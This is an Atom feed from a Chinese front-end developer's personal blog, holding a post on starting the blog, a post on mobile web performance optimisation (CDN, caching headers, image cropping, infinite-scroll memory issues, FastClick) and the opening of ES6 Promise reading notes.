<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>易浮的小窝</title>
  <subtitle>做一个有情怀的Coder</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/Hyifu/"/>
  <updated>2017-05-01T02:14:39.000Z</updated>
  <id>https://github.com/Hyifu/</id>
  
  <author>
    <name>Hyifu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>写给我的小屋</title>
    <link href="https://github.com/Hyifu/2017/04/23/%E5%86%99%E7%BB%99%E6%88%91%E7%9A%84%E5%B0%8F%E5%B1%8B/"/>
    <id>https://github.com/Hyifu/2017/04/23/写给我的小屋/</id>
    <published>2017-04-22T16:00:00.000Z</published>
    <updated>2017-05-01T02:14:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>不管怎么说，我还是把自己的 Github Page 搭建了起来，顺带整理了之前云笔记里的东西，既然如此，纪念一下也是可以的</p>
<a id="more"></a>
<p>算起来，从来到深圳正式成为一名全职的前端开发，马上就要两年了。两年的前端之路，与大部分公司要求的 3～5 年前端经验相比，简直就是分分钟找不到工作的节奏</p>
<p>在这两年里，跟着团队经历了一个又一个的项目，虽然很粗糙，虽然微不足道，但还是获益匪浅。写技术博客，在我看来是一件很需要勇气的事，如果没有足够的技术积累，何必展示给其他人看呢？我不认为看一个小学生演算四则运算对你的数学会有多大的长进，因此一直持着谨慎的态度。</p>
<p>但是毕竟还是喜欢总结一下过去开发中遇到的有趣的事情，因此我慢慢养成一个习惯：如果你觉得有一本技术书籍可以学到你觉得很不错的技术，那么尝试看第二遍第三遍，并把其中觉得有新发现的地方，用自己的方式做一次笔记，总有一天这本书你再看的时候就觉得没有什么值得做笔记的了，求学时代老师们的说法是：“把一本书读薄”</p>
<p>看书是一件挺痛苦的事情，尤其是你对这个技术一点积累都没有的时候，我第一次看《JavaScript 高级程序设计》的时候，基本上只是认识字罢了，只能看得懂一些关于 API 的调用；第二次再看的时候，原型和继承就得跳过去，高级技巧对我而言也是没啥意思的部分；第三次再看的时候，就觉得这本书也不过如此嘛，里面讲的我都知道，不会的时候看得懂就好；第四次看的时候我已经又看了许多其他的书了，这时我真是赞叹这本书讲的东西是多么深入浅出。我明白了一个道理：经典就是经典，隔行如隔山，如果我觉得一个技术或行业是简单的容易的，那么一定是没有足够深入地去了解它们内在的本质。</p>
<p>我不应该去忽略很多技术上的细节，我习惯记录一些在开发中遇到的有趣的事情，虽然由于项目进度或者是认识不到位，并没有足够的能力在当时看到其中透露的一些信息，但我觉得只要足够在意，总会有所收获的。</p>
<p>很久之前，我看到一个评论说，如果一个技术博客写的不严谨，那么最好还是不要出来丢人现眼了。我当时深以为然，因此我从来就没有写过所谓的博客，我觉得自己还是很菜，还不到时候可以把自己的看法完善，因此我唯唯诺诺地只敢把自己的看法和探索过程简要地记录在云笔记中。我印象中很深刻的是，我在仔细研究完 jQuery 的 API 后，把自己的思路和看法写在了 Markdown 存在云笔记，顺带还发了一份到群里，希望有人与我共鸣，然并卵。似乎是受到了一些打击，我决定这么幼稚的分析还是自己好好再琢磨琢磨。</p>
<p>每过三个月再回头看自己写的代码，一定会觉得当时的自己怎么那么傻逼，我不写博客，或者说这个博客本质上是只给我自己看就好的，我喜欢把自己当成一个读者，想尽办法假装自己是一个很菜的读者，或者说是写给三个月前的自己看的——我知道三个月前的自己是什么样的水平，那时的他应该用怎样的描述才能让他明白这个东西原来是这样呢？于是，我又把书给读厚了，因为满满都是解释。</p>
<p>所以如果你无意进来看到这个小屋，请一定要知道，我只是在写给三个月前的自己看罢了。自己给自己讲故事也是有趣的一件事，您觉得呢？</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;不管怎么说，我还是把自己的 Github Page 搭建了起来，顺带整理了之前云笔记里的东西，既然如此，纪念一下也是可以的&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>前端性能优化小扎</title>
    <link href="https://github.com/Hyifu/2017/04/16/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%B0%8F%E6%89%8E/"/>
    <id>https://github.com/Hyifu/2017/04/16/前端性能优化小扎/</id>
    <published>2017-04-15T16:00:00.000Z</published>
    <updated>2017-05-01T02:14:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近做完了 DDYQ 这个项目，这是一个基于手机微信端端 APP 应用（也通过套壳端方式运行在 Android 上），为了节省可怜端服务器资源以及回应运营吐槽打开速度慢，我跟后端一起针对性能做了不少优化，有了新的认识，虽然缺乏详细数据的支持（并没有做性能监听），我们主要基于资源压缩和网络延迟考量（白屏时间和首屏时间）。再加上之前针对访问量比较多的大客户店铺的性能优化经验，由于本人并不参与后端开发，因此纯后端的性能优化并没有深刻的认识，按下不谈，主要还是针对前端开发做一个总结。</p>
<a id="more"></a>
<h1 id="HTTP-部分"><a href="#HTTP-部分" class="headerlink" title="HTTP 部分"></a>HTTP 部分</h1><p>这是一般性能优化的大头，尤其是对于轻应用而言，手机端的浏览器性能并不会成为瓶颈，往往主要还是受限于手机网络巨大的延迟。我们在实践中并没有完全使用所有的优化，而是有侧重点地考虑多种因素和成本。现在来说一下我当初考虑到的点都有哪些（下面几个小节其实相互有交集）</p>
<h4 id="HTTP-链接池分析"><a href="#HTTP-链接池分析" class="headerlink" title="HTTP 链接池分析"></a>HTTP 链接池分析</h4><p>第一个针对的点就是HTTP链接池——为保证链接质量和服务器压力，一般浏览器对同一个域名对并发请求会有一个数量上对限制，一般是 4～6 个并发。一般针对这个，我们考虑的是 CDN 分离静态资源：使用 CDN 有几个好处：</p>
<ol>
<li>分散了域名，突破了浏览器对并发链接数量对限制</li>
<li>可以对资源进行缓存，提高了服务器的响应速度</li>
<li>CDN 一般提供分布式存储，使得物理网络的距离缩小，减少代理转发和路由延迟</li>
<li>减少了 Cookie 的携带，同时主服务器也不会接受到静态资源的请求</li>
</ol>
<p>在主题开发中，我们确实是使用了 CDN 进行域名分散，因为静态资源的占比会比较高，用户可能会使用大量的图片进行店铺装修，使用 CDN 有利于减轻主服务器的压力。但是在 DDYQ 中，最终并没有进行 CDN 分发，这里考虑了这么几个因素：</p>
<ul>
<li><p>开发成本<br>CDN 分发需要进行额外的资源部署（当然，这成本微乎其微）</p>
</li>
<li><p>应用体量<br>不同于店铺，DDYQ 的体量很小，在优化即使是全新加载，主要资源网络占用也只有 300K，配合后续的缓存策略和持久链接，CDN 对网络性能的影响百分比在个位数级别</p>
</li>
<li><p>用户群体<br>这里有一个很关键的决策点是，应用本身只针对移动群体。我们知道，移动网络的瓶颈其实不在于带宽而在于延迟（至少在 4G 普及后，加载一个不到 1M 的网页，带宽的影响没想象中大）。另外，DDYQ 全站启用了 HTTPS，域名收敛（即减少请求池中域名的数量）后可以节省 DNS 查找和 SSL 握手／TCP 握手带来的巨大的延迟开销</p>
</li>
<li><p>用户体量<br>与店铺系统不同，DDYQ 的用户体量目前还比较小，很多时候服务器只需要处理千级并发，因此在处理 SSL 加密解密和资源请求等开销上，服务器（有效利用Node的高并发，数据库读写分离与 Redis）的压力还算比较小</p>
</li>
</ul>
<p>综上，针对链接池的优化，我们还是重点考虑了网络延迟对移动用户带来的影响为主，但理解其他因素的影响也有助于选取更加合适的策略</p>
<h4 id="HTTP-头部优化"><a href="#HTTP-头部优化" class="headerlink" title="HTTP 头部优化"></a>HTTP 头部优化</h4><p>我们知道，HTTP 是无状态的，为保证记录用户的登录状态，后台会设置一个 HTTPOnly 的 Cookie 配合服务器 Session 保持认证，这个 Cookie 对浏览器端是半透明的（前端并不能读写），而且每次与服务器交互都会带上这个 Cookie，因此 Cookie 数量越多，HTTP 头就越大，这自然会导致数据包的增大。</p>
<p>在没有启用 SPDY／HTTP 2.0 的情况下，一般只有几种方式压缩 HTTP 头部（其实只是针对 Cookie）：</p>
<ul>
<li>尽量只使用简单链接（GET 和 POST）减少头部额外信息</li>
<li>尽量减少 Cookie 携带的字符串，一般而言这个比较不实用</li>
<li>使用 CDN：跨域访问出于安全的考量，并不会携带 Cookie</li>
</ul>
<p>其实对于 HTTP 头部，能做的事情比较有限（近似认为只有 CDN 分离），但我们至少可以期待一下即将到来的 HTTP 2.0，这可是 Web 开发者的一个盛宴</p>
<h4 id="HTTP-资源优化"><a href="#HTTP-资源优化" class="headerlink" title="HTTP 资源优化"></a>HTTP 资源优化</h4><p>前面提到了 HTTP 的优化包括提高并发下载效率，减少重复传输，但其实对传输性能提升的影响不是最主要的。可以想象，HTTP 就好像是快递公司，数据包相当于一个个快递包裹，压缩头部其实类似于减轻运输车辆的重量，启用 CDN 相当于分别使用多条高速公路避免拥堵（其实也减少运输距离），启用持久链接则相当于不用每辆车都重新规划路线（减少握手，类似直接跟随前面车辆），启用 HTTP 2.0／SPDY 则相当于直接开通一条专线铁路。可以看到，最快最稳定当然是开专线，但成本太高，现阶段不太可能。那么其他的方法都是不错的选择，不过我们不应该忽略，最核心的应该是减少包裹的数量和重量。</p>
<p>这里所说的资源优化，是指使用更小的数据包达到使用大数据包的用户体验，这里有一些共识：</p>
<ul>
<li>启用 Gzip 压缩，这个是所有浏览器和服务器都会使用的，因此没啥好说的</li>
<li><p>合并请求，减少握手次数和网络延迟<br>这里主要是指合并脚本和图片，比如常用的雪碧图，就是为了减少额外的 TCP／SSL 握手而出现的技术，我们并没有使用雪碧图（因为应用的图片相对较少较小）而使用了样式内联的 Base64 编码，同时使用了 webpack 进行了模块化开发最终将脚本和样式合并成一个单文件引入。在这里需要注意，合并资源不是简单地把所有同类型的资源集中在一起（这常会导致单资源体积过大，如在单页应用中单一 JS 过大会导致首屏时间过长，而应该考虑代码分割），而是根据需要进行适当的资源数量区分</p>
</li>
<li><p>压缩混淆脚本和样式，减少无用信息加大数据包体积<br>这里一般而言就是使用 <code>CSSminify</code> 和 <code>UglyfyJS</code> 去除代码的注释，局部变量替换等（其实在 Gzip 的存在下，更多是删除无效的信息如注释。其他混淆对体积减小并不明显）</p>
</li>
<li><p>使用 Ajax 传输核心资源并使用脚本拼接，而非通过服务器生成完整页面传送<br>这里有一个对比，在店铺主题系统中，我们的页面考虑到 SEO 优化，基本上都是通过 <a href="https://shopify.github.io/liquid/" target="_blank" rel="external">Liquid 模版引擎</a> 来动态生成店铺信息，这样会有一个问题，那就是服务器每次被访问均需要动态渲染出完整的 HTML，这样不仅对服务器的计算压力大（这里其实提供了缓存策略，提供页面的缓存而不是每次均要访问引擎服务器），而且在传输的时候由于是完整的 HTML，体积也相对会大一些。</p>
</li>
</ul>
<p>而在 DDYQ 这个移动应用中，考虑到并不需要进行 SEO，我们使用了单页应用的开发方式（SPA），因此服务器并不需要承担计算的压力（如果这里把静态资源放在 CDN，基本就只承担 Ajax 的压力），而后续访问中由于缓存策略，极大地减少了 HTTP 流量</p>
<ul>
<li>使用最合适的图片和多媒体资源</li>
</ul>
<p>这里其实道理很明显，不同的媒体格式的体积是不一样的。在移动 Web 中，我们没必要使用分辨率巨大的 4K 视频，因为用户体验的提升不明显，对于图片也是，<code>jpeg</code> 格式和 <code>png</code> 在不同的适应场景在同样的用户体验中，其大小是不一样的。一般建议简单的图片使用 <code>png</code>。还有就是只针对 Retina 屏幕才使用高清素材（通过媒体查询判别）</p>
<h4 id="最优缓存策略"><a href="#最优缓存策略" class="headerlink" title="最优缓存策略"></a>最优缓存策略</h4><p>在我们项目中，这是最重要与常见的 HTTP 优化策略，前面说到，静态资源可以启用 CDN 缓存优化，可以通过 CDN 的优点加快访问并且减小服务器压力，这里也会针对 CDN 说明一下更进一步的性能优化。</p>
<p>我们知道第一次访问页面的时候浏览器会根据需要缓存一些静态资源，如脚本和样式表，这样第二次的时候再访问同一个页面（如果页面无任何改变）就可以直接使用缓存而无需再次向服务器请求了。我们的关注点其实是放在如何告诉浏览器需要更新缓存与否。</p>
<p>首先，一般不应该让浏览器缓存 HTML，因为 HTML 的内容直接指示着资源的引用，也就是相当于一个入口，试想，入口一直原来的旧文件，引用资源也就谈不上更新可言了，所以除非特殊奇怪的情况，否则 HTML 不应该使用任何缓存机制</p>
<blockquote>
<p>这里发生了一件真实的事情，在 DDYQ 第一次优化的时候，我们指定了 HTTP 缓存头，但是发现后面更新活动的时候发现，线上并没有任何改变，后面查找原因才知道后端不小心也把首页 HTML 做成永久缓存了</p>
</blockquote>
<p>关于缓存更新机制，其实如果分开讲解会比较复杂与繁琐，这里我借用网络上的一张图来说明一下：<br><img src="/images/前端性能优化小扎-缓存.png" alt="前端性能优化小扎-缓存"></p>
<p>如上图所示，左图是首次加载，浏览器并没有做任何的缓存；右图则是再次访问的时候，一般已经存在缓存了，因此需要判断是否需要更新缓存。</p>
<ul>
<li><p>判断缓存是否过期<br><code>Expires</code> 和 <code>Cache-control</code> 都提供缓存是否过期的判断，不过前者出现的时机更早，兼容 HTTP 1.0；后者是前者的进化版，具备更加精细的控制选项，支持 HTTP 1.1。在实际开发中，<code>Cache-control</code> 的优先级和重要性要大得多。当通过这两个 HTTP 头判断出缓存已经过期，则进入下一步</p>
</li>
<li><p><code>Etag</code>/ <code>If-None-Match</code><br><code>Etag</code> 是资源在服务器上的唯一标识，一般在资源变动的时候由服务器自动分配。浏览器发现过期的缓存带有 <code>Etag</code>，则将会向服务器发送带有 <code>If-None-Match</code> 的请求（就是 <code>Etag</code> 的值），服务器收到请求后会比较最新资源的 <code>Etag</code> 是否一致，并依此返回 200 或 304</p>
</li>
<li><p><code>Last-Modified</code> / <code>If-Modified-Since</code><br>同理，浏览器发现过期的换粗带有 <code>Last-Modified</code> 时也会向服务器发送一个携带该值的请求，服务器同样是比较最新资源的修改时间并返回 200 或 304</p>
</li>
</ul>
<blockquote>
<p><code>Etag</code> 和 <code>Last-Modified</code> 一般不会同时出现，因为这会增加服务器配置的难度。通常而言，<code>Etag</code> 验证的优先级会更高，同时对资源的版本控制会更强。服务器返回 200 状态码其实是告诉浏览器缓存过期了，需要重新下载。而 304 则是告诉浏览器缓存依然可以使用</p>
</blockquote>
<p>但其实我们在实际的开发中，基本都是使用永久缓存更新机制——设置超长有效期的 <code>Cache-control</code>，这样浏览器永远也不会进入询问缓存是否有效这个阶段（即使是 304 也还是需要一次请求），转而使用更改资源引用路径的方式来强制更新资源，换句话说，如果一个脚本的引用名称没有改变（每次更新使用自动化给脚本增加一段唯一标识符 MD5），它就是永久有效的。这种更新与利用缓存的机制，可以大大地提高资源的利用率，并且减小来服务器的压力，是现代 Web 应用的常用手段。</p>
<blockquote>
<p>最后推荐一个知乎的回答：<a href="https://www.zhihu.com/question/20790576" target="_blank" rel="external">大公司里怎样开发和部署前端代码？</a><br>高票答案 @张云龙 其实非常形象生动地讲解了前端更新部署的流程，包括其原理和进化史</p>
</blockquote>
<h1 id="客户端部分"><a href="#客户端部分" class="headerlink" title="客户端部分"></a>客户端部分</h1><p>客户端部分的优化其实相对而言，不像网络优化那样具备特别明显的提升，不过在现如今越来越注重用户体验的趋势下，客户端的流畅度也是一个产品质量的绝对考量指标之一。</p>
<h4 id="图片裁剪技术"><a href="#图片裁剪技术" class="headerlink" title="图片裁剪技术"></a>图片裁剪技术</h4><p>我们第一个需要关注的对象是图片的裁剪，之所以关注这个，是因为在主题系统或者 DDYQ 中，其中的图片均是由用户自行上传的，虽然我们提供了建议尺寸，但是还是发现在很多不需要大图的地方，用户还是使用了超高分辨率的图片（比如头像）。因此减小图片的尺寸将有效减轻服务器压力和加速页面渲染，这里听起来好像是服务端需要做的事情，但是前面提到，我们是使用了 CDN 网络的，因此图片存储其实是由 CDN 提供商负责的，如七牛云存储，他们提供了 <a href="https://developer.qiniu.com/dora/api/1279/basic-processing-images-imageview2" target="_blank" rel="external">图片压缩的功能</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 在 DDYQ 返回的图片地址 http://odum9helk.qnssl.com/resource/gogopher.jpg 上进行裁剪操作 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://odum9helk.qnssl.com/resource/gogopher.jpg?imageView2/1/w/200/h/200"</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 在主题中使用 Liquid 进行图片大小限制--&gt;</span></div><div class="line">&#123;&#123; blog_author.avatar | image_url : 400, 400 &#125;&#125;</div></pre></td></tr></table></figure></p>
<h4 id="瀑布流的秘密"><a href="#瀑布流的秘密" class="headerlink" title="瀑布流的秘密"></a>瀑布流的秘密</h4><p>我们都使用过微博，不管在客户端还是在网页版本，只要你希望看到更多，你可以一直往下滚动，查到到好友们源源不断的动态。这种体验非常好的设计就叫做 <code>瀑布流</code>。在没有对这种设计做出深入理解以前，你可能很难理解实现 <code>瀑布流</code> 是一件非常需要技术的事情，我在经历了两次 <code>瀑布流</code> 性能优化以后（一次是 <a href="http://thefirstgive.com" target="_blank" rel="external">初礼电商移动版本的首页</a>，一次是 <a href="https://ddyq888.com" target="_blank" rel="external">DDYQ 的首页</a>），虽然这两个由于功能实现其实是不一样的，不过还是让我吃到了各自的苦头</p>
<ul>
<li><p>资源加载问题<br>第一个需要面对的是，资源如何加载。初礼刚开始是使用 Liquid 进行缓存输出的，很多人也会觉得直接用 HTMl 输出不是个问题。那么这里需要考虑你服务器的负载条件和瀑布的长度了。使用 HTML 直出几十个微博动态，那么也许是个好主意，但是如果像初礼那样，把整个店铺的上千个商品都塞到首页瀑布中，相信我，你不会想着去访问的。这将耗费你几十兆的流量，加载了愈千个图片！</p>
<p>考虑网络的因素和服务器的压力，我们最后使用了 Ajax 动态加载商品，一次只加载二十个，浏览到底部再加载二十个，依此类推。同时也用到了前面所说的图像裁剪策略（为节省流量和提高网速甚至抛弃了 Retina 屏幕），不仅如此，后台甚至还专门提供了一套 API，获取商品信息时可以只获取常用数据（JSON 大小只是完整版本的约三分之一）</p>
</li>
</ul>
<ul>
<li>网页流畅度问题</li>
</ul>
<p>如果放在十年前，我想这个问题肯定会特别严重，不幸的是，即使现在智能手机性能和浏览器效率都如此之高的现在，在加载了超长的瀑布流之后，浏览器的运行流畅度也遭遇了考验。</p>
<p>首先是滚动卡顿的问题，我们在一个 DIV 中放置了瀑布流，那么在移动设备中会出现一定的卡顿，这是因为移动浏览器需要同时判断内部滚动条和外部滚动条以及滚动回弹。<br>解决方法是在给该 <code>DIV</code> 加上一个属性 <code>-webkit-overflow-scrolling : touch</code>，这样系统会认为这里需要弹性滚动（手指滑动速度越快，滚动越快，感受起来更流畅更像原生 app），会充分利用硬件加速的优势，代价是付出更高的内存消耗，不过考虑到整个瀑布流一般只需要一个外框，所以内存一般是可以接受的</p>
<p>其次是内存泄露的问题，可能很不可思议，但瀑布流确确实实有可能导致内存泄露，最终导致整个页面瘫痪，这是血的教训！</p>
<blockquote>
<p>有一次客户向我们反馈，用户在某些情况下页面会卡住。他在打开页面后可以正常使用，但如果这时接到一个电话（或其他 APP 的操作），再回来查看页面，就发现页面完全不可交互了。后来我们发现，他使用了国产品牌比较老旧的一款智能手机，系统内存非常有限，因此在打开页面时基本消耗了系统大部分的内存，而切换多任务的时候，系统把这部分内存释放给了其他应用。因此再回来页面后就会卡死。</p>
</blockquote>
<p>解决这个问题花费了不少心机，在动态加载后，我们还加上了 <code>DOM</code> 优化。其实道理很简单，页面 DOM 中的每一个标签，都是一个非常庞大的 DOM 对象。我们常说 DOM 操作是很费性能的，其实不被操作的 DOM 本身就很耗费性能，因此想办法减少 DOM 本身存在就是一种优化策略：优化 DOM 结构，减少标签嵌套和标签属性都有利于性能。这里我们参考手机淘宝，把 <code>&lt;img&gt;</code> 标签全部干掉了，取而代之将图片作为背景图片放置在包裹元素上达到同样的视觉效果。我觉得这是最简单适用的优化方式，在这次事件后我写代码非常注意不要出现无意义的嵌套和冗余的标签，因为这也是作为一名前端工程师的职业素养：做到极致，而不是被逼到极致</p>
<p>另外还有一个更激进的优化方法（鉴于难度成本和瀑布流长度，也考虑目标用户的机器性能，我们并没有实际应用）：适当回收不需要使用的 DOM。比如一个瀑布流完全加载后有一万条咨询，那么用户实际看到的部分可能只有不到一百条，将一万个塞到 DOM 中是没有意义的，而且及其耗费内存，那么我们可以将用户正在浏览的一百条以外的内容的 DOM “删除”——转将关键数据而存储到一个 JS 数组中（JS 数组的内存和 CPU 开销远远小于 DOM），然后监听用户的操作行为如滚动，在需要的时候进行替换。</p>
<h4 id="FastClick"><a href="#FastClick" class="headerlink" title="FastClick"></a>FastClick</h4><p>在手机浏览器中，有一个双击放大的功能。但是浏览器其实并没有办法真实地知道你是单纯的点击还是要进行双击操作，因此会在第一次点击后等待约 300ms，如果在这时间内又捕捉到了一次点击则判断为双击。因此在移动端其实可以认为没有 <code>click</code> 事件，取而代之的是 <code>tap</code> 事件，这种体验问题也叫做 <code>tap</code> 穿透</p>
<p>因此这实际上是一件非常影响体验的事情：你每次点击一次屏幕，感觉都会出现延迟（让人感觉性能不好）！解决这个问题最好的办法一般是引入下面这个库<br><a href="https://github.com/ftlabs/fastclick/">FastClick</a></p>
<blockquote>
<p>其实 iOS 10 更新中的 Safari 和最新的 Chrome 中已经解决了这个体验问题，双击不再是放大了。<br><code>FastClick</code> 采取的解决方案其实是监听 <code>touchstart</code>、<code>touchend</code> 和 <code>touchmove</code>，并根据它们的关联来对用户行为进行模拟，同时取消原有的 <code>click</code> 事件</p>
</blockquote>
<h4 id="代码分割与服务器渲染"><a href="#代码分割与服务器渲染" class="headerlink" title="代码分割与服务器渲染"></a>代码分割与服务器渲染</h4><p>前面其实有提到，合并多余的脚本和样式可以节省一次网络请求，在移动网络延迟如此之高的情况下（我们很难保证链接会被重用），不失为一种良好的优化策略，我们在 DDYQ 中使用来 <code>Vue.js</code> 作为开发框架，也就是说它是一个单页应用（SPA）</p>
<p>SPA 的一个好处是减小了后端的计算压力。但是完全基于 Ajax 的 前端 SPA 实现有几个问题：一是失去了 SEO，第二个是首屏渲染时间会变慢（因为一般将整个 APP 的脚本和样式都分别放在一个文件里，体积相对会大一些）。后者的原因是，浏览器对 HTML 有渐进渲染的功能，我们打开超大的网页是一点一点显示的。而通过脚本动态插入 DOM 的方式则是不可能触发渐进渲染的，因此相比之下，首页渲染时间会更长一些。</p>
<p>解决以上问题的方法就是，代码分割和服务器渲染：<br>代码分割其实我们一直在用，你看，我们在官网中总是把全局需要的东西放在首页（如 <code>jQuery</code>），而只有某个页面才需要的东西单独放在那个模块，这样用户访问首页的时候需要下载的脚本会相对少一些，减小来首页时间。代码分割也是这样的道理，只下载首页需要的脚本或资源，而把其它页面的资源做成单独的资源（可能做成延迟加载）</p>
<p>服务器渲染更多是解决 SEO 的问题，我们官网的源码其实是基于 <code>haml</code>（方便管理修改），需要引擎编译一边输出 HTML（通常缓存 HTML），不过遗憾的是，除此之外我对服务器渲染所知甚少，因为 DDYQ 这种应用既不需要考虑 SEO，同时体量也较小，代码分割和服务器渲染均不是一件节省成本且必要的事情</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>对于 Web 性能的方面的研究，我所知甚少，尤其是对于后端方面几乎可以是零认知。如果有机会，我希望可以学习到性能监控和流量跟踪，压力测试和负载均衡等等，这些很难在具体某本书籍中看到，更多的是一个团队的实战经验，也需要实际的项目磨练。</p>
<p>不过对于入门 Web 性能，我觉得以下几本书是很值得推荐的：</p>
<ul>
<li><a href="https://item.jd.com/11688195.html" target="_blank" rel="external">《高性能网站建设指南》</a></li>
<li><a href="https://item.jd.com/11691824.html" target="_blank" rel="external">《高性能网站建设进阶指南》</a></li>
<li><a href="https://item.jd.com/11444582.html" target="_blank" rel="external">《Web性能权威指南》</a></li>
</ul>
<p>尤其是最后一本，谈及了许多基于 HTTP 层面的优化和原理，对于现代互联网 Web 开发是颇有裨益的，因为随着 CPU 的日益强大（即使是移动端，也有高通835和苹果A10这种性能怪兽），客户端的性能优化对体验的提升其实是相对比较小的，尤其是对于移动轻应用而言。虽然网络能力也随着 4G网络日渐强大，但无线网络始终还是受限于复杂的干扰和手机省电的原因拥有较高的延迟和丢包。因此在 HTTP 2.0 全面普及之前，我觉得还是有必要着重从网络入手谈性能。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近做完了 DDYQ 这个项目，这是一个基于手机微信端端 APP 应用（也通过套壳端方式运行在 Android 上），为了节省可怜端服务器资源以及回应运营吐槽打开速度慢，我跟后端一起针对性能做了不少优化，有了新的认识，虽然缺乏详细数据的支持（并没有做性能监听），我们主要基于资源压缩和网络延迟考量（白屏时间和首屏时间）。再加上之前针对访问量比较多的大客户店铺的性能优化经验，由于本人并不参与后端开发，因此纯后端的性能优化并没有深刻的认识，按下不谈，主要还是针对前端开发做一个总结。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《ECMAScript 6入门》阅读笔记（下）</title>
    <link href="https://github.com/Hyifu/2017/03/23/%E3%80%8AECMAScript%206%20%E5%85%A5%E9%97%A8%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>https://github.com/Hyifu/2017/03/23/《ECMAScript 6 入门》阅读笔记（下）/</id>
    <published>2017-03-22T16:00:00.000Z</published>
    <updated>2017-05-01T02:15:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>下半部分，主要考量了全新的异步模式 Promise 和 Generator 以及它们的语法糖 async。当然，还有超级好用的的模块实现，以及让人头大的的类，这里建议配合<a href="https://item.jd.com/12030814.html" target="_blank" rel="external">《你不知道的JavaScript（中）》</a>的第二部分反复阅读，理解 JavaScript 强大的异步实现</p>
<p><img src="/images/ECMAScript6入门.jpg" alt="ECMAScript6入门"></p>
<a id="more"></a>
<h2 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h2><blockquote>
<p>Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大</p>
</blockquote>
<ul>
<li>两个特点<ul>
<li>Promise 对象有三种状态：Pending、Resolved 和 Rejected。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态</li>
<li>一旦状态改变，就不会再变，任何时候都可以得到这个结果</li>
<li>无法取消 Promise，一旦新建它就会立即执行，无法中途取消</li>
<li>如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部</li>
<li>处于 Pending 状态时，无法得知目前进展到哪一个阶段</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(resolve, reject) &#123;</div><div class="line">	<span class="comment">// promise 这里会立即执行</span></div><div class="line">	<span class="keyword">if</span> (<span class="literal">true</span>) &#123; <span class="comment">// 异步成功</span></div><div class="line">		resolve(value) <span class="comment">// 把 value 作为参数传出去</span></div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'报错啦'</span>)) <span class="comment">// 通常是 Error 对象的实例</span></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// then 方法的第二个参数一般不建议使用，使用 .catch() 替代，使代码更优雅可读，同时可捕捉回调函数中抛出的错误</span></div><div class="line">promise.then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</div><div class="line">	<span class="comment">// 处理结果</span></div><div class="line">&#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</div><div class="line">	<span class="comment">// 相当于 .then(null, function (error) &#123;..&#125;)</span></div><div class="line">	<span class="comment">// 处理错误</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<ul>
<li><p>resolve 的参数可以也可是一个 promise 实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">  <span class="comment">// ...</span></div><div class="line">&#125;)</div><div class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">  <span class="comment">// ...</span></div><div class="line">  resolve(p1) <span class="comment">// 在这里，p1 的状态就传给了 p2，会等待 p1 的状态决议后才执行</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure>
</li>
<li><p><code>Promise.prototype.then()</code></p>
<blockquote>
<p>本方法接受两个参数 <code>resolve</code> 和 <code>reject</code>（但不建议使用第二个参数，而是使用 <code>.catch()</code> 方法替代），返回一个新的 Promise 实例（不是原来那个），因此可以使用链式继续调用 <code>.then()</code> 方法</p>
</blockquote>
</li>
</ul>
